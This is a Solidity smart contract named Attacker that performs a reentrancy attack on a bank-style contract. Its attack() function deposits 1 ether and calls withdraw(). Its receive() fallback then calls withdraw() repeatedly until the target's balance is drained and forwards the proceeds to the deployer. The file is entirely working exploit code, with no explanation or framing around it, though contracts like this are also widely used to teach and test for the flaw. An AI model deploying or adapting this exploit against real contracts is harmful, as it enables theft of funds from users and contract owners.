// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.9;

interface IBank {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker {
    IBank public test;
    address payable public owner;

    constructor(address _testAddr) payable {
        test = IBank(_testAddr);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        test.deposit{value: 1 ether}();
        test.withdraw();
    }

    function getOwnerBalance() public view returns (uint256) {
        return owner.balance;
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        if (address(test).balance > 1) {
            test.withdraw();
        } else {
            (bool ok, ) = payable(owner).call{value: address(this).balance}("");
            require(ok, "Call failed!");
        }
    }
}
